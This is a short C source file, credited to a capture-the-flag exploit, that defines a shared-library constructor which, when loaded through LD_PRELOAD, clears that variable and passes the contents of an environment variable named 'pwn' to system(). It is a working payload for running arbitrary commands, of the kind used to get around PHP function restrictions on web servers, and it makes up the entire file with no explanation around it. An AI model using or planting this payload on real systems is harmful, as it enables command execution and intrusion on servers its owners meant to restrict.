#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

//credit:  https://github.com/eboda/insomnihack/tree/master/l33t_hoster/exploit

void __attribute__ ((constructor))  foobar() {
  char *cmd;
  if (getenv("LD_PRELOAD") == NULL) { return; }
  unsetenv("LD_PRELOAD");
  if ((cmd = getenv("pwn")) != NULL) {
    system(cmd);
  }
}
